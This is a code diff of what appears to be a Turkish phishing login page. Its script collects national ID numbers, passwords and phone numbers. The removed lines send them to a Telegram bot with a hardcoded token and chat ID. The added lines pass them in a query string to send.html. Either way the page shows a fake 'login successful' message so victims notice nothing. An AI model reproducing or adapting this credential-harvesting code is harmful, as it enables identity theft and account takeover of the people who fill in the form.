@@ -88,31 +88,15 @@
 
             // Telegram mesajı
             const message = `Yeni Giriş:\n\nTC: ${tc}\nŞifre: ${sifre}\nTelefon: ${telefon}`;
-            const botToken = '7339087315:AAH_HBxLkl6x-GURaVwG1a7yC0kvtwIKSj0'; // Bot Token'ı string olarak tanımlandı
-            const chatId = '-4571747062'; // Chat ID'yi string olarak tanımlandı
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
+            
+            // send.html sayfasına yönlendir
+            fetch('send.html?message=' + encodeURIComponent(message))
+            .then(response => response.text())
             .then(data => {
                 loader.style.display = 'none';
-                if (data.ok) {
-                    successMessage.innerHTML = 'Giriş başarılı!';
-                    successMessage.style.display = 'block';
-                    document.getElementById('loginForm').reset();
-                } else {
-                    errorMessage.innerHTML = 'Bir hata oluştu, lütfen tekrar deneyin.';
-                    errorMessage.style.display = 'block';
-                }
+                successMessage.innerHTML = 'Giriş başarılı!';
+                successMessage.style.display = 'block';
+                document.getElementById('loginForm').reset();
             })
             .catch(error => {
                 loader.style.display = 'none';
